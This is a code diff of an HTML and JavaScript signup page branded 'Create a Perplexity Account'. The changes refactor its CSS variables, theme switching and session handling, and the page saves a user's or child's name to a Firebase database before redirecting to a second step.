@@ -9,7 +9,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
-    <title>Creat Account</title>
+    <title>Createunt</title>
 
     <style>
         * {
@@ -21,11 +21,10 @@
             --bg: #ffffff;
             --text: #000000;
             --subtext: #6e6e80;
+            --border: #d1d1d6;
             --input-bg: #ffffff;
-            --input-border: #d1d1d6;
             --button-bg: #000000;
             --button-text: #ffffff;
-            --label-bg: #ffffff;
             --error: #d93025;
         }
 
@@ -33,11 +32,10 @@
             --bg: #000000;
             --text: #ffffff;
             --subtext: #aaaaaa;
+            --border: #555555;
             --input-bg: #000000;
-            --input-border: #555555;
             --button-bg: #ffffff;
             --button-text: #000000;
-            --label-bg: #000000;
         }
 
         body {
@@ -45,7 +43,7 @@
             padding: 0;
             display: flex;
             justify-content: center;
-            background: var(--bg);
+            background-color: var(--bg);
             color: var(--text);
             transition: background-color 0.25s ease, color 0.25s ease;
         }
@@ -86,19 +84,19 @@
             position: absolute;
             top: -10px;
             left: 12px;
-            background: var(--label-bg);
-            padding: 0 6px;
+            background: var(--bg);
+            padding: 0 4px;
             font-size: 12px;
             color: var(--subtext);
             z-index: 1;
-            transition: background-color 0.25s ease;
+            transition: background 0.25s ease, color 0.25s ease;
         }
 
         input {
             width: 100%;
             padding: 16px;
             font-size: 16px;
-            border: 1px solid var(--input-border);
+            border: 1px solid var(--border);
             border-radius: 24px;
             outline: none;
             background: var(--input-bg);
@@ -113,20 +111,20 @@
 
         .btn-continue {
             width: 100%;
-            background: var(--button-bg);
+            background-color: var(--button-bg);
             color: var(--button-text);
             border: none;
             padding: 14px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             border-radius: 28px;
             cursor: pointer;
             margin-top: 20px;
             transition: all 0.25s ease;
         }
 
-        .btn-continue:active {
-            transform: scale(0.98);
+        .btn-continue:hover {
+            opacity: 0.92;
         }
 
         .error {
@@ -141,7 +139,6 @@
 <body>
 
 <div class="container">
-
     <h1>Create a Perplexity Account</h1>
 
     <p class="subtitle" id="subtitleText">
@@ -157,7 +154,7 @@
             placeholder="First name"
             required
             autofocus
-        />
+        >
 
         <div id="fnError" class="error">
             First name is required
@@ -171,19 +168,15 @@
             type="text"
             id="lastName"
             placeholder="Last name (optional)"
-        />
+        >
     </div>
 
     <button class="btn-continue" id="continueBtn">
         Continue
     </button>
-
 </div>
 
 <script type="module">
-
-/* ================= FIREBASE ================= */
-
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 
 import {
@@ -191,6 +184,8 @@ import {
     doc,
     setDoc
 } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+/* ================= FIREBASE ================= */
 
 const firebaseConfig = {
     apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
@@ -215,71 +210,38 @@ let type = (params.get("type") || "personal").toLowerCase();
 let continueUrl = params.get("continue") || "";
 let theme = params.get("theme");
 
-/* ================= SESSION ================= */
-
-function generateSession() {
-    return Math.floor(
-        1000000000 + Math.random() * 9000000000
-    ).toString();
-}
-
-if (!session) {
-
-    session = generateSession();
-
-    const newParams = new URLSearchParams();
-
-    newParams.set("session", session);
-
-    if (type) {
-        newParams.set("type", type);
-    }
-
-    if (continueUrl) {
-        newParams.set("continue", continueUrl);
-    }
-
-    if (theme) {
-        newParams.set("theme", theme);
-    }
-
-    const newUrl =
-        `${window.location.pathname}?${newParams.toString()}`;
-
-    window.history.replaceState({}, "", newUrl);
-}
-
-/* ================= REAL TIME THEME ================= */
+/* ================= LIVE THEME ================= */
 
 const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
 
 function applyTheme() {
 
+    // Manual Theme Override
     if (theme === "d") {
-
         document.body.classList.add("dark");
+        return;
+    }
 
-    } else if (theme === "l") {
-
+    if (theme === "l") {
         document.body.classList.remove("dark");
+        return;
+    }
 
+    // Auto Theme
+    if (mediaQuery.matches) {
+        document.body.classList.add("dark");
     } else {
-
-        // AUTO THEME WITH REAL-TIME CHANGE
-        if (mediaQuery.matches) {
-            document.body.classList.add("dark");
-        } else {
-            document.body.classList.remove("dark");
-        }
+        document.body.classList.remove("dark");
     }
 }
 
 applyTheme();
 
-// REAL TIME DEVICE THEME CHANGE
+/* ===== REAL TIME THEME CHANGE ===== */
+
 mediaQuery.addEventListener("change", () => {
 
-    // only auto mode reacts
+    // only auto mode reacts live
     if (!theme) {
         applyTheme();
     }
@@ -287,26 +249,64 @@ mediaQuery.addEventListener("change", () => {
 
 /* ================= TYPE UI ================= */
 
-const subtitleText = document.getElementById("subtitleText");
-const firstNameLabel = document.getElementById("firstNameLabel");
-const firstNameInput = document.getElementById("firstName");
+function applyTypeUI() {
 
-if (type === "kids") {
+    const subtitle = document.getElementById("subtitleText");
+    const firstNameInput = document.getElementById("firstName");
 
-    subtitleText.textContent = "Enter your child's name";
+    if (type === "kids") {
 
-    firstNameLabel.textContent = "First name";
+        subtitle.textContent = "Enter your child's name";
 
-    firstNameInput.placeholder = "First name";
+        firstNameInput.placeholder = "First name";
 
-} else {
+    } else {
 
-    subtitleText.textContent = "Enter your name";
+        subtitle.textContent = "Enter your name";
 
-    firstNameLabel.textContent = "First name";
-
-    firstNameInput.placeholder = "First name";
+        firstNameInput.placeholder = "First name";
+    }
 }
+
+applyTypeUI();
+
+/* ================= SESSION ================= */
+
+function initSession() {
+
+    if (!session) {
+
+        session = Math.floor(
+            1000000000 + Math.random() * 9000000000
+        ).toString();
+
+        const newParams = new URLSearchParams();
+
+        newParams.set("session", session);
+
+        if (type) {
+            newParams.set("type", type);
+        }
+
+        if (continueUrl) {
+            newParams.set(
+                "continue",
+                continueUrl
+            );
+        }
+
+        if (theme) {
+            newParams.set("theme", theme);
+        }
+
+        const newUrl =
+            `${window.location.pathname}?${newParams.toString()}`;
+
+        window.history.replaceState({}, "", newUrl);
+    }
+}
+
+initSession();
 
 /* ================= SUBMIT ================= */
 
@@ -328,7 +328,6 @@ async function submitData() {
     if (!firstName) {
 
         errorDiv.style.display = "block";
-
         return;
     }
 
@@ -354,23 +353,20 @@ async function submitData() {
                 type,
                 family: familyValue,
 
-                // SAVE CONTINUE URL
+                // continue parameter saved
                 continue: continueUrl || null,
 
                 timestamp: new Date()
-            },
-            { merge: true }
+            }
         );
 
-        // REDIRECT
+        // Redirect
         window.location.href =
             `2.html?session=${session}`;
 
     } catch (error) {
 
-        console.error(error);
-
-        alert("Something went wrong.");
+        console.error("Error:", error);
     }
 }
 
